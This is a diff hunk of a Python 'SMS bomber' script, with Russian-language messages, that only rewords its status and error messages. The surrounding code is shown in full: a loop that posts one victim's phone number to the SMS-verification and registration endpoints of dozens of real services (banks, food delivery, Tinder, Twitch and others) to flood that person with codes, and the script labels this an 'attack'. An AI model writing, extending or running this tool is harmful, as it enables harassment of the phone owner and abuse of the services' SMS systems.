             requests.post('https://online.sbis.ru/reg/service/',
@@ -13486,11 +13486,11 @@ if call == str(2):
             R = R + 1
             print('[+] Sberbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -13502,44 +13502,44 @@ if call == str(2):
             R = R + 1
             print('[+] Psbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             R = R + 1
             print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.carsmile.com/",
@@ -13548,22 +13548,22 @@ if call == str(2):
             R = R + 1
             print('[+] carsmile отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -13571,11 +13571,11 @@ if call == str(2):
             R = R + 1
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -13583,11 +13583,11 @@ if call == str(2):
             R = R + 1
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -13596,11 +13596,11 @@ if call == str(2):
             R = R + 1
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -13609,11 +13609,11 @@ if call == str(2):
             R = R + 1
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -13621,33 +13621,33 @@ if call == str(2):
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
@@ -13655,11 +13655,11 @@ if call == str(2):
             R = R + 1
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -13667,11 +13667,11 @@ if call == str(2):
             R = R + 1
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -13680,11 +13680,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -13692,44 +13692,44 @@ if call == str(2):
             R = R + 1
             print('[+] OK отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://plink.tech/register/', json={"phone": _phone})
             R = R + 1
             print('[+] Plink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -13737,11 +13737,11 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -13751,11 +13751,11 @@ if call == str(2):
             R = R + 1
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -13763,10 +13763,10 @@ if call == str(2):
             R = R + 1
             print('[+] CabWiFi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -13774,11 +13774,11 @@ if call == str(2):
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -13787,22 +13787,22 @@ if call == str(2):
             R = R + 1
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -13812,33 +13812,33 @@ if call == str(2):
             R = R + 1
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -13849,10 +13849,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -13861,10 +13861,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -13872,10 +13872,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -13884,10 +13884,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -13895,10 +13895,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -13908,10 +13908,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -13919,7 +13919,7 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
 
 
     input()
